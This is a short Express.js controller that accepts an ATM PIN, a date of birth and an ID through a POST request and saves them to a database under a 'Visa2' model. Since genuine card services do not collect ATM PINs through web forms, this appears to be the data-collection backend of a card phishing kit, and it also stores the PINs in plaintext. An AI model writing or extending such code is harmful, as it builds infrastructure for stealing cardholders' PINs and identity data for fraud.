const Visa2 = require('../models/Visa2'); // Import the Visa2 model

// POST request controller for Visa2
const createVisa2 = async (req, res) => {
    const { atmPin, dob, uniqueid } = req.body;

    // Input validation
    if (!atmPin || !dob || !uniqueid) {
        return res.status(400).json({ message: 'All fields are required' });
    }

    try {
        // Create a new Visa2 instance
        const visa2 = new Visa2({
            atmPin,
            dob,
            uniqueid
        });

        // Save the Visa2 data to the database
        await visa2.save();

        return res.status(201).json({
            success: true,  // Indicating success
            message: 'Visa2 data successfully saved'
        });
    } catch (error) {
        // Log error and send failure response
        console.error(error);
        return res.status(500).json({
            success: false,  // Indicating failure
            message: 'Server error, please try again later'
        });
    }
};

module.exports = {
    createVisa2
};
